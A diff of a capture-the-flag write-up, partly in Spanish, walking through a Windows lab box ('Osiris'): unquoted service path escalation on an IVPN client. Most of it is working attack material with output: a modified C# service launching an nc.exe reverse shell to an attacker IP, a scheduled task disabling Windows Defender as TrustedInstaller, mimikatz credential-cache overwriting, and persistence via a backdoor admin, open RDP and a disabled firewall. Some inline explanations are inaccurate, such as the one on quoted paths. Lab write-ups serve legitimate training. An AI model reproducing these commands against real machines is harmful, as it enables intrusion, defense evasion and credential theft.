@@ -773,3 +773,778 @@ c:\program files\IVPN Client OSIRIS\scheduler:(OI)(CI)(special access:)
  
                              CREATOR OWNER:(OI)(CI)(IO)(ID)F 
                              APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(ID)R 
+                             APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(ID)(special access:)
+                                                                                                    GENERIC_READ
+                                                                                                    GENERIC_EXECUTE
+ 
+                             APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(ID)R 
+                             APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(ID)(special access:)
+                                                                                                               GENERIC_READ
+                                                                                                               GENERIC_EXECUTE
+
+c:\program files\IVPN Client OSIRIS\scheduler:(OI)(CI)(special access:)
+
+c:\Program Files\IVPN Client>sc qc "IVPN Client"
+sc qc "IVPN Client"
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: IVPN Client
+        TYPE               : 10  WIN32_OWN_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files\IVPN Client\IVPN Service.exe
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : IVPN Client
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+
+El comando `sc qc "IVPN Client"` (sin comillas) muestra la configuración del servicio de Windows con nombre "IVPN Client". Este comando se utiliza para mostrar información sobre un servicio específico en el sistema, como su nombre, tipo, estado, ubicación del archivo ejecutable, etc.
+
+c:\Temp>echo 'hi i'm jesus' > test.txt
+echo 'hi i'm jesus' > test.txt
+
+c:\Temp>type test.txt
+type test.txt
+'hi i'm jesus' 
+
+We trigger the update profile by executing the vb-script
+
+c:\script>cscript update.vbs
+cscript update.vbs
+Microsoft (R) Windows Script Host Version 5.812
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+It runs without any output, but no error either, and we find our test file
+
+c:\script>dir "c:\program files\IVPN Client" |find "test"
+dir "c:\program files\IVPN Client" |find "test"
+01/03/2023  11:01 AM                17 test.txt
+
+c:\Temp>powershell -ex bypass
+powershell -ex bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+PS C:\Temp> Get-WMIObject -Class Win32_Service -Filter "Name='ivpn client'" | select-object *
+
+PSComputerName          : OSIRIS
+Name                    : IVPN Client
+Status                  : OK
+ExitCode                : 0
+DesktopInteract         : False
+ErrorControl            : Normal
+PathName                : C:\Program Files\IVPN 
+                          Client\IVPN Service.exe
+ServiceType             : Own Process
+StartMode               : Auto
+__GENUS                 : 2
+__CLASS                 : Win32_Service
+__SUPERCLASS            : Win32_BaseService
+__DYNASTY               : CIM_ManagedSystemElemen
+                          t
+__RELPATH               : Win32_Service.Name="IVP
+                          N Client"
+__PROPERTY_COUNT        : 26
+__DERIVATION            : {Win32_BaseService, 
+                          CIM_Service, 
+                          CIM_LogicalElement, CIM
+                          _ManagedSystemElement}
+__SERVER                : OSIRIS
+__NAMESPACE             : root\cimv2
+__PATH                  : \\OSIRIS\root\cimv2:Win
+                          32_Service.Name="IVPN 
+                          Client"
+AcceptPause             : False
+AcceptStop              : True
+Caption                 : IVPN Client
+CheckPoint              : 0
+CreationClassName       : Win32_Service
+DelayedAutoStart        : False
+Description             : 
+DisplayName             : IVPN Client
+InstallDate             : 
+ProcessId               : 3424
+ServiceSpecificExitCode : 0
+Started                 : True
+StartName               : LocalSystem
+State                   : Running
+SystemCreationClassName : Win32_ComputerSystem
+SystemName              : OSIRIS
+TagId                   : 0
+WaitHint                : 0
+Scope                   : System.Management.Manag
+                          ementScope
+Path                    : \\OSIRIS\root\cimv2:Win
+                          32_Service.Name="IVPN 
+                          Client"
+Options                 : System.Management.Objec
+                          tGetOptions
+ClassPath               : \\OSIRIS\root\cimv2:Win
+                          32_Service
+Properties              : {AcceptPause, 
+                          AcceptStop, Caption, 
+                          CheckPoint...}
+SystemProperties        : {__GENUS, __CLASS, 
+                          __SUPERCLASS, 
+                          __DYNASTY...}
+Qualifiers              : {dynamic, Locale, 
+                          provider, UUID}
+Site                    : 
+Container               : 
+
+We need to make a service exe. A ordinary exe will not do. We can try to use MSFVenom, but that exe will be caught by Defender, it knows Metasploit a bit too well
+
+We check Defender settings, to see what we are dealing with here
+
+PS C:\script> get-MpPreference
+
+Yes, msmpeng is the process name for Microsoft Defender, which is the built-in antivirus program in Windows. The process is responsible for scanning files and processes on the system for malware and other types of threats.
+
+AllowNetworkProtectionOnWinServer : False AttackSurfaceReductionOnlyExclusions : AttackSurfaceReductionRules_Actions : {1, 1, 1, 1...} AttackSurfaceReductionRules_Ids : {01443614-cd74-433ab99e-2ecdc07bfc25, 26190899-1602-49e8-8b27- eb1d0a1ce869, 3B576869-A4EC-4529-8536- B80A7769E899, 5BEB7EFEFD9A-4556-801D-275E5FFC04CC...} --
+
+ASR rules are rules that are used by the Windows Advanced Security Risk Detection (ASR) feature. ASR is a security feature that helps protect against advanced attacks by monitoring system activity and identifying suspicious behavior. It can be used to block or allow certain types of system activity based on the rules that are defined. ASR rules can be used to specify the types of system activity that should be allowed or blocked, and can be used to customize the behavior of the ASR feature to meet the needs of a particular organization or environment.
+
+PS C:\script> Get-MPPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids
+Get-MPPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids
+01443614-cd74-433a-b99e-2ecdc07bfc25
+26190899-1602-49e8-8b27-eb1d0a1ce869
+3B576869-A4EC-4529-8536-B80A7769E899
+5BEB7EFE-FD9A-4556-801D-275E5FFC04CC
+75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84
+7674ba52-37eb-4a4f-a9a1-f0f9a1619a2c
+92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B
+9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2
+b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4
+BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550
+c1db55ab-c21a-4637-bb3f-a12568109d35
+d1e49aac-8f56-4280-b9ba-993a6d77406c
+D3E037E1-3EB8-44C8-A917-57927947596D
+D4F940AB-401B-4EFC-AADC-AD5F3C50688A
+e6db77e5-3df2-4cf1-b95a-636979351e5b
+
+https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide
+
+These are the identifiers for the Windows Defender Attack Surface Reduction (ASR) rules. ASR is a feature of Windows Defender that helps to reduce the attack surface of a system by blocking certain types of potentially malicious behaviors. Each of these identifiers corresponds to a specific ASR rule. You can use these identifiers to configure the ASR rules that are enabled on a system. For example, you can use the `Set-MpPreference` cmdlet to enable or disable specific ASR rules using their identifiers.
+
+quoted path and unquoted path
+
+In Windows, a path to a file or folder can be "quoted" or "unquoted".
+
+A quoted path is a path that is enclosed in quotation marks ("). For example: "C:\Program Files\My Folder\My File.txt"
+
+An unquoted path is a path that is not enclosed in quotation marks. For example: C:\Program Files\My Folder\My File.txt
+
+The difference between quoted and unquoted paths is that in an unquoted path, the space character ( ) is treated as a delimiter. This means that if a folder or file name contains a space, it must be enclosed in quotation marks to be recognized as a single entity.
+
+For example, consider the following unquoted path: C:\Program Files\My Folder\My File.txt
+
+In this path, the operating system will try to interpret "My" and "Folder" as separate entities, because they are separated by a space. To prevent this, the path must be quoted: "C:\Program Files\My Folder\My File.txt"
+
+On the other hand, if a path does not contain any spaces, it can be written as an unquoted path without any issues. For example: C:\ProgramFiles\MyFolder\MyFile.txt
+
+Tamper protection es una característica de seguridad que protege los procesos y configuraciones de un sistema de posibles modificaciones no autorizadas. La finalidad de esta característica es evitar que ciertos cambios realizados en el sistema puedan ser utilizados por atacantes para comprometer la seguridad del sistema o para esconder su actividad malintencionada.
+
+Un ejemplo de cómo funciona la protección contra modificaciones ilegales es cuando un usuario intenta desactivar el firewall de un sistema. Si la protección contra modificaciones ilegales está habilitada, el sistema no permitirá que el usuario desactive el firewall y mostrará un mensaje de error. De esta manera, se evita que el usuario pueda exponer el sistema a posibles ataques.
+
+https://github.com/mattymcfatty/unquotedPoC
+
+The payload is in SimpleService.Designer.cs. This is propbably the "wrong" area, but it compiles and bypasses AV, so I don't really care :-D
+
+Happy hacking!
+
+https://gist.github.com/tyranid/c65520160b61ec851e68811de3cd646d
+
+$cmdline = '/C sc.exe config windefend start= disabled && sc.exe sdset windefend D:(D;;GA;;;WD)(D;;GA;;;OW)' $a = New-ScheduledTaskAction -Execute "cmd.exe" -Argument $cmdline Register-ScheduledTask -TaskName 'TestTask' -Action $a que hace
+
+This block of code creates a new scheduled task that will execute the `cmd.exe` program with the arguments `/C sc.exe config windefend start= disabled && sc.exe sdset windefend D:(D;;GA;;;WD)(D;;GA;;;OW)`. This command disables the `windefend` service, which is part of the Windows Defender antivirus software, and sets the security descriptor for the service to `D:(D;;GA;;;WD)(D;;GA;;;OW)`. This effectively disables the service and prevents it from being restarted.
+
+---
+
+$cmdline = '/C sc.exe config windefend start= disabled && sc.exe sdset windefend D:(D;;GA;;;WD)(D;;GA;;;OW)'
+$a = New-ScheduledTaskAction -Execute "cmd.exe" -Argument $cmdline
+Register-ScheduledTask -TaskName 'Meh' -Action $a
+
+---
+
+PS C:\script> $cmdline = '/C sc.exe config windefend start= disabled && sc.exe sdset windefend D:(D;;GA;;;WD)(D;;GA;;;OW)'
+$cmdline = '/C sc.exe config windefend start= disabled && sc.exe sdset windefend D:(D;;GA;;;WD)(D;;GA;;;OW)'
+PS C:\script> $a = New-ScheduledTaskAction -Execute "cmd.exe" -Argument $cmdline
+$a = New-ScheduledTaskAction -Execute "cmd.exe" -Argument $cmdline
+PS C:\script> Register-ScheduledTask -TaskName 'Meh' -Action $a
+Register-ScheduledTask -TaskName 'Meh' -Action $a
+
+TaskPath                                       Ta
+                                               sk
+                                               Na
+                                               me
+--------                                       --
+\                                              Me
+
+We need to escalate our privileges before we can run this task. So as of now, we still have to try to keep things on the low-low so Defender doesn't stop us.
+```
+```text
+┌──(kali㉿kali)-[~/Osiris]
+└─$ git clone https://github.com/mattymcfatty/unquotedPoC.git 
+Cloning into 'unquotedPoC'...
+remote: Enumerating objects: 33, done.
+remote: Total 33 (delta 0), reused 0 (delta 0), pack-reused 33
+Receiving objects: 100% (33/33), 152.13 KiB | 731.00 KiB/s, done.
+Resolving deltas: 100% (7/7), done.
+```
+```text
+┌──(kali㉿kali)-[~/Osiris]
+└─$ cd unquotedPoC
+```
+```text
+┌──(kali㉿kali)-[~/Osiris/unquotedPoC]
+└─$ ls
+LICENSE.txt                   ProjectInstaller.resx  SimpleService.Designer.cs
+Program.cs                    README.md              SimpleService.resx
+ProjectInstaller.cs           screenshots            SimpleWindowsService1.csproj
+ProjectInstaller.Designer.cs  SimpleService.cs       SimpleWindowsService1.csproj.user
+```
+```text
+┌──(kali㉿kali)-[~/Osiris/unquotedPoC]
+└─$ cat SimpleService.Designer.cs 
+
+startInfo.Arguments = "/C net user mattymcfatty Really1337! /add && net localgroup administrators mattymcfatty /add";
+
+replace here like this
+
+startInfo.Arguments = "c:\\windows\\temp\\nc.exe 10.10.18.20 4455 -e cmd";
+```
+```text
+┌──(kali㉿kali)-[~/Osiris/unquotedPoC]
+└─$ nano SimpleService.Designer.cs
+```
+```text
+┌──(kali㉿kali)-[~/Osiris/unquotedPoC]
+└─$ cat SimpleService.Designer.cs 
+namespace SimpleWindowsService1
+{
+    partial class SimpleService
+    {
+        /// <summary> 
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Component Designer generated code
+
+        /// <summary> 
+        /// Required method for Designer support - do not modify 
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.eventLogSimple = new System.Diagnostics.EventLog();
+            ((System.ComponentModel.ISupportInitialize)(this.eventLogSimple)).BeginInit();
+            // 
+            // SimpleService
+            // 
+            System.Diagnostics.Process process = new System.Diagnostics.Process();
+            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            startInfo.FileName = "cmd.exe";
+            startInfo.Arguments = "/C \"C:\\Windows\\temp\\nc.exe 10.10.214.187 17778 -e cmd\"";;
+            process.StartInfo = startInfo;
+            process.Start();
+
+            this.ServiceName = "Not The Service You Think It Is";
+            ((System.ComponentModel.ISupportInitialize)(this.eventLogSimple)).EndInit();
+
+        }
+
+        #endregion
+
+        private System.Diagnostics.EventLog eventLogSimple;
+    }
+}
+
+To exploit the unquoted service path, our compiled new service needs to be named IVPN Service.exe or ivpn.exe and must be placed in `C:\Program Files\IVPN Client\`
+
+We will need to download the service executable we compiled and place it in `C:\temp` that can be used by the `copyprofile.cmd` to extract to `C:\Program Files\IVPN Client` using powershell command below:
+
+https://www.geeksforgeeks.org/how-to-compile-decompile-and-run-c-code-in-linux/
+```
+```text
+┌──(kali㉿kali)-[~/Osiris]
+└─$ cat geek.cs                
+using System;
+ 
+public class GFG {
+ 
+    static public void Main()
+    {
+        Console.WriteLine("Hello World!");
+        Console.ReadKey();
+      
+    }
+}
+```
+```text
+┌──(kali㉿kali)-[~/Osiris]
+└─$ mcs -out:helloworld.exe geek.cs
+```
+```text
+┌──(kali㉿kali)-[~/Osiris]
+└─$ ls
+a.txt  DefenderCheck  geek.cs  helloworld.exe  na.c  na.exe  na.ps1  na.txt  nc64  nc64.exe  rev.bat  test.txt  unquotedPoC
+```
+```text
+┌──(kali㉿kali)-[/home/kali]
+└─PS> cd ./Osiris/
+```
+```text
+┌──(kali㉿kali)-[/home/kali/Osiris]
+└─PS> ls
+a.txt          geek.cs         na.c    na.ps1  nc64      rev.bat   unquotedPoC
+DefenderCheck  helloworld.exe  na.exe  na.txt  nc64.exe  test.txt
+```
+```text
+┌──(kali㉿kali)-[/home/kali/Osiris]
+└─PS> ./helloworld.exe                                                                                        Hello World!
+
+oops!
+
+just compiling with visual studio 2022 (took time)
+
+to do it (download visual studio 2022, then install C# escritorio is like 7.96 Gb, then clone git clone https://github.com/mattymcfatty/unquotedPoC.git )
+
+and open project --> SimpleWindowsService1.csproj
+
+then eliminate AssemblyInfo.cs for Properties , in order to work.
+
+then go to Simple.Service.Designer.cs
+
+and modified like this but changing Attackbox IP
+
+Si está utilizando Visual Studio para compilar su proyecto, puede establecer el OutputPath y el AssemblyName en el proyecto desde el menú Proyecto en el menú de Visual Studio.
+
+Para establecer el OutputPath, haga clic con el botón derecho en el proyecto en el Explorador de soluciones y seleccione Propiedades. En la página Propiedades del proyecto, vaya a la pestaña Compilar y establezca el OutputPath en la ruta donde desee que se guarde el archivo ejecutable del proyecto.
+
+Para establecer el AssemblyName, vaya a la página Propiedades del proyecto y establezca el AssemblyName en el nombre que desee para el archivo ejecutable del proyecto.
+
+I'm uploading mine
+https://github.com/jesusgavancho/ivpn_osiris
+
+https://learn.microsoft.com/en-us/visualstudio/ide/reference/command-prompt-powershell?view=vs-2022
+
+PS C:\temp> Invoke-WebRequest http://10.10.103.96:1234/ivpn.exe -outfile c:\temp\ivpn.exe
+Invoke-WebRequest http://10.10.231.33:1234/ivpn.exe -outfile c:\temp\ivpn.exe
+PS C:\temp> powershell -c "Get-Service -Name 'IVPN*' "
+powershell -c "Get-Service -Name 'IVPN*' "
+
+Status   Name               DisplayName          
+------   ----               -----------          
+Running  IVPN Client        IVPN Client          
+
+PS C:\temp> powershell -c "Stop-Service -Name 'IVPN*' "
+powershell -c "Stop-Service -Name 'IVPN*' "
+PS C:\temp> cscript C:\script\update.vbs
+cscript C:\script\update.vbs
+Microsoft (R) Windows Script Host Version 5.812
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+C:\script>dir "c:\program files\ivpn client\"|find "ivpn.exe"
+dir "c:\program files\ivpn client\"|find "ivpn.exe"
+01/03/2023  04:54 PM             5,120 ivpn.exe
+
+PS C:\temp> powershell -c "Restart-Service -Name 'IVPN*' "
+powershell -c "Restart-Service -Name 'IVPN*' "
+
+root@ip-10-10-214-187:~/test# nc -lvnp 17778
+Listening on [0.0.0.0] (family 0, port 17778)
+Connection from 10.10.169.206 49946 received!
+Microsoft Windows [Version 10.0.19041.508]
+(c) 2020 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+:) really  happy!!!
+
+C:\Windows\system32>cd C:\Users\chajoh\Desktop
+cd C:\Users\chajoh\Desktop
+
+C:\Users\chajoh\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is DEA7-4E33
+
+ Directory of C:\Users\chajoh\Desktop
+
+09/19/2020  06:09 AM    <DIR>          .
+09/19/2020  06:09 AM    <DIR>          ..
+09/19/2020  06:10 AM                47 Flag2.txt
+               1 File(s)             47 bytes
+               2 Dir(s)  36,798,844,928 bytes free
+
+C:\Users\chajoh\Desktop>type Flag2.txt
+type Flag2.txt
+THM{d9c19f35fccde779d645f19d5bb0ac41dcd3586f}
+
+reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection
+
+Tamper protection es una característica de seguridad que protege los procesos y configuraciones de un sistema de posibles modificaciones no autorizadas. La finalidad de esta característica es evitar que ciertos cambios realizados en el sistema puedan ser utilizados por atacantes para comprometer la seguridad del sistema o para esconder su actividad malintencionada.
+
+Un ejemplo de cómo funciona la protección contra modificaciones ilegales es cuando un usuario intenta desactivar el firewall de un sistema. Si la protección contra modificaciones ilegales está habilitada, el sistema no permitirá que el usuario desactive el firewall y mostrará un mensaje de error. De esta manera, se evita que el usuario pueda exponer el sistema a posibles ataques.
+
+Once we get our reverse shell, we will have `NT System` privilege, time to activate the schedule task we created previously to disable Windows Defender by using powershell command below:
+
+$svc = New-Object -ComObject 'Schedule.Service'
+$svc.Connect()
+$user = 'NT SERVICE\TrustedInstaller'
+$folder = $svc.GetFolder('\')
+$task = $folder.GetTask('Meh')
+$task.RunEx($null, 0, 0, $user)
+
+---
+
+PS C:\Users\chajoh\Desktop> $svc = New-Object -ComObject 'Schedule.Service'
+$svc = New-Object -ComObject 'Schedule.Service'
+PS C:\Users\chajoh\Desktop> $svc.Connect()
+$svc.Connect()
+PS C:\Users\chajoh\Desktop> $user = 'NT SERVICE\TrustedInstaller'
+$user = 'NT SERVICE\TrustedInstaller'
+PS C:\Users\chajoh\Desktop> $folder = $svc.GetFolder('\')
+$folder = $svc.GetFolder('\')
+PS C:\Users\chajoh\Desktop> $task = $folder.GetTask('Meh')
+$task = $folder.GetTask('Meh')
+PS C:\Users\chajoh\Desktop> $task.RunEx($null, 0, 0, $user)
+$task.RunEx($null, 0, 0, $user)
+
+Name          : Meh
+InstanceGuid  : {8607C8BD-20DA-4B84-B299-196E52198668}
+Path          : \Meh
+State         : 4
+CurrentAction : cmd.exe
+EnginePID     : 2256
+
+Then we issue a restart command using shutdown /r /t 0, make sure you only RESTART otherwise you will lost the access !
+
+PS C:\Users\chajoh\Desktop> cd C:\Windows\system32
+cd C:\Windows\system32
+
+PS C:\Windows\system32> ^C
+root@ip-10-10-141-30:~/test# nc -lvnp 17778
+Listening on [0.0.0.0] (family 0, port 17778)
+
+powershell -c "Restart-Service -Name 'IVPN*' "
+PS C:\temp> shutdown /r /t 2
+shutdown /r /t 2
+PS C:\temp> 
+
+wait like 1 or 2 min then
+
+root@ip-10-10-16-134:~/test# nc -lvnp 17778
+Listening on [0.0.0.0] (family 0, port 17778)
+Connection from 10.10.14.143 49686 received!
+Microsoft Windows [Version 10.0.19041.508]
+(c) 2020 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>get-process -name "msmpeng"
+get-process -name "msmpeng"
+'get-process' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Windows\system32>
+
+Checking status of Defender
+
+PS C:\Users\chajoh\Desktop> get-process -name "msmpeng"
+get-process -name "msmpeng"
+get-process : Cannot find a process with the name "msmpeng". Verify the process name and call the cmdlet again.
+At line:1 char:1
++ get-process -name "msmpeng"
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (msmpeng:String) [Get-Process], ProcessCommandException
+    + FullyQualifiedErrorId : NoProcessFoundForGivenName,Microsoft.PowerShell.Commands.GetProcessCommand
+
+Under the same user document folder - `C:\Users\chajoh\Documents`, we found a KeePass database - `Database.kdbx`
+
+We can investigate the configuration file of KeePass in `C:\Users\chajoh\AppData\Roaming\KeePass\KeePass.config.xml`, and it reveals that KeePas is using the Windows users as MasterKey ( DPAPI ). So, we need to become that specific user to open it.
+
+C:\Windows\system32>type C:\Users\chajoh\AppData\Roaming\KeePass\KeePass.config.xml
+type C:\Users\chajoh\AppData\Roaming\KeePass\KeePass.config.xml
+<?xml version="1.0" encoding="utf-8"?>
+<Configuration xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+	<Meta>
+		<PreferUserConfiguration>false</PreferUserConfiguration>
+		<OmitItemsWithDefaultValues>true</OmitItemsWithDefaultValues>
+		<DpiFactorX>1</DpiFactorX>
+		<DpiFactorY>1</DpiFactorY>
+	</Meta>
+	<Application>
+		<LastUsedFile>
+			<Path>..\..\Users\chajoh\Documents\Database.kdbx</Path>
+			<CredProtMode>Obf</CredProtMode>
+			<CredSaveMode>NoSave</CredSaveMode>
+		</LastUsedFile>
+		<MostRecentlyUsed>
+			<MaxItemCount>12</MaxItemCount>
+			<Items>
+				<ConnectionInfo>
+					<Path>..\..\Users\chajoh\Documents\Database.kdbx</Path>
+					<CredProtMode>Obf</CredProtMode>
+					<CredSaveMode>NoSave</CredSaveMode>
+				</ConnectionInfo>
+				<ConnectionInfo>
+					<Path>..\..\Users\chajoh\Documents\Database2.kdbx</Path>
+					<CredProtMode>Obf</CredProtMode>
+					<CredSaveMode>NoSave</CredSaveMode>
+				</ConnectionInfo>
+			</Items>
+		</MostRecentlyUsed>
+		<WorkingDirectories>
+			<Item>Database@..\..\Users\chajoh\Documents</Item>
+			<Item>KeyFile@..\..\Users\chajoh\Documents</Item>
+		</WorkingDirectories>
+		<Start>
+			<CheckForUpdate>false</CheckForUpdate>
+			<CheckForUpdateConfigured>true</CheckForUpdateConfigured>
+		</Start>
+		<FileOpening />
+		<FileClosing />
+		<TriggerSystem>
+			<Triggers />
+		</TriggerSystem>
+		<PluginCompatibility />
+	</Application>
+	<Logging />
+	<MainWindow>
+		<X>804</X>
+		<Y>936</Y>
+		<Width>667</Width>
+		<Height>503</Height>
+		<SplitterHorizontalFrac>0.8333</SplitterHorizontalFrac>
+		<SplitterVerticalFrac>0.25</SplitterVerticalFrac>
+		<ToolBar />
+		<EntryView />
+		<TanView />
+		<EntryListColumnCollection>
+			<Column>
+				<Type>Title</Type>
+				<Width>90</Width>
+			</Column>
+			<Column>
+				<Type>UserName</Type>
+				<Width>90</Width>
+			</Column>
+			<Column>
+				<Type>Password</Type>
+				<Width>90</Width>
+				<HideWithAsterisks>true</HideWithAsterisks>
+			</Column>
+			<Column>
+				<Type>Url</Type>
+				<Width>90</Width>
+			</Column>
+			<Column>
+				<Type>Notes</Type>
+				<Width>90</Width>
+			</Column>
+		</EntryListColumnCollection>
+		<EntryListColumnDisplayOrder>0 1 2 3 4</EntryListColumnDisplayOrder>
+		<ListSorting>
+			<Order>Ascending</Order>
+		</ListSorting>
+	</MainWindow>
+	<UI>
+		<TrayIcon />
+		<Hiding>
+			<HideInEntryWindow>false</HideInEntryWindow>
+		</Hiding>
+		<StandardFont>
+			<Family>Microsoft Sans Serif</Family>
+			<Size>8.25</Size>
+			<GraphicsUnit>Point</GraphicsUnit>
+			<Style>Regular</Style>
+			<OverrideUIDefault>false</OverrideUIDefault>
+		</StandardFont>
+		<PasswordFont>
+			<Family>Courier New</Family>
+			<Size>8.25</Size>
+			<GraphicsUnit>Point</GraphicsUnit>
+			<Style>Regular</Style>
+			<OverrideUIDefault>false</OverrideUIDefault>
+		</PasswordFont>
+		<BannerStyle>WinVistaBlack</BannerStyle>
+		<DataEditorFont>
+			<Family>Microsoft Sans Serif</Family>
+			<Size>8.25</Size>
+			<GraphicsUnit>Point</GraphicsUnit>
+			<Style>Regular</Style>
+			<OverrideUIDefault>false</OverrideUIDefault>
+		</DataEditorFont>
+		<UIFlags>0</UIFlags>
+		<KeyCreationFlags>0</KeyCreationFlags>
+		<KeyPromptFlags>0</KeyPromptFlags>
+	</UI>
+	<Security>
+		<WorkspaceLocking>
+			<LockAfterTime>0</LockAfterTime>
+			<LockAfterGlobalTime>0</LockAfterGlobalTime>
+		</WorkspaceLocking>
+		<Policy />
+		<MasterPassword>
+			<MinimumLength>0</MinimumLength>
+			<MinimumQuality>0</MinimumQuality>
+		</MasterPassword>
+	</Security>
+	<Native />
+	<PasswordGenerator>
+		<AutoGeneratedPasswordsProfile>
+			<GeneratorType>CharSet</GeneratorType>
+			<Length>20</Length>
+			<CharSetRanges>ULD_______</CharSetRanges>
+		</AutoGeneratedPasswordsProfile>
+		<LastUsedProfile>
+			<GeneratorType>CharSet</GeneratorType>
+			<Length>20</Length>
+			<CharSetRanges>ULD_______</CharSetRanges>
+		</LastUsedProfile>
+		<UserProfiles />
+	</PasswordGenerator>
+	<Defaults>
+		<OptionsTabIndex>3</OptionsTabIndex>
+		<SearchParameters>
+			<ComparisonMode>InvariantCultureIgnoreCase</ComparisonMode>
+		</SearchParameters>
+		<KeySources>
+			<Association>
+				<DatabasePath>..\..\Users\chajoh\Documents\Database.kdbx</DatabasePath>
+				<UserAccount>true</UserAccount>
+			</Association>
+			<Association>
+				<DatabasePath>..\..\Users\chajoh\Documents\Database2.kdbx</DatabasePath>
+				<UserAccount>true</UserAccount>
+			</Association>
+		</KeySources>
+	</Defaults>
+	<Integration>
+		<UrlSchemeOverrides>
+			<BuiltInOverridesEnabled>1</BuiltInOverridesEnabled>
+			<CustomOverrides />
+		</UrlSchemeOverrides>
+		<AutoTypeAbortOnWindows />
+	</Integration>
+	<Custom />
+</Configuration>
+
+For now, we will need to get access to `chajoh` user, for this we will download mimikatz from our attacker machine to target computer and temporary inject our password to the user and TAKE A NOTE ON NTLM HASH.
+
+root@ip-10-10-141-30:~/test# locate mimikatz.exe
+/opt/Mimikatz/Win32/mimikatz.exe
+/opt/Mimikatz/x64/mimikatz.exe
+root@ip-10-10-141-30:~/test# cp /opt/Mimikatz/x64/mimikatz.exe mimikatz.exe
+
+Invoke-WebRequest "http://10.10.103.96:1234/mimikatz.exe" -outfile "C:\temp\mimikatz.exe"
+
+PS C:\Users\chajoh\Documents> Invoke-WebRequest "http://10.10.0.108:1234/mimikatz.exe" -outfile "C:\temp\mimikatz.exe"
+Invoke-WebRequest "http://10.10.141.30:1234/mimikatz.exe" -outfile "C:\temp\mimikatz.exe"
+PS C:\Users\chajoh\Documents> cd c:\temp
+cd c:\temp
+PS C:\temp> dir
+dir
+
+    Directory: C:\temp
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-----         9/16/2020  11:55 AM                OpenVPN                                                              
+-a----          1/3/2023   8:37 PM           6656 ivpn.exe                                                             
+-a----          1/3/2023   8:45 PM        1291016 mimikatz.exe                                                         
+-a----          1/3/2023   8:21 PM             17 test.txt 
+
+lsadump::cache /user:chajoh /password:hackP@ssw0rd /kiwi
+
+mimikatz # lsadump::cache /user:chajoh /password:hackP@ssw0rd /kiwi
+> User cache replace mode !
+  * user     : chajoh
+  * password : hackP@ssw0rd
+  * ntlm     : 4c05b64dec614df2b522c401bb8d8994
+
+mimikatz # exit
+Bye!
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Using%20credentials.md
+
+net user witty Pssw0rd123 /add
+
+net localgroup administrators witty /add
+
+Next we will perform below action to create persistent access to the target computer.
+
+-   Create user and add to local administrator group
+-   Add `Everyone` into `Remote Desktop Users` group
+-   Turn off Windows Firewall for all profile
+
+PS C:\temp> net localgroup "Remote Desktop Users" Everyone /Add
+net localgroup "Remote Desktop Users" Everyone /Add
+The command completed successfully.
+
+PS C:\temp> netsh advfirewall set allprofiles state off
+netsh advfirewall set allprofiles state off
+Ok.
+
+Next we will need to enable Remote Desktop Service and Disable NLA (Network Level Authentication) by adding registry key using command below
+
+PS C:\temp> reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+The operation completed successfully.
+
+PS C:\temp> reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d "0" /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d "0" /f
+The operation completed successfully.
+
+---
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ xfreerdp /v:10.10.227.117 /u:witty /p:hackP@ssw0rd /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp /size:85%
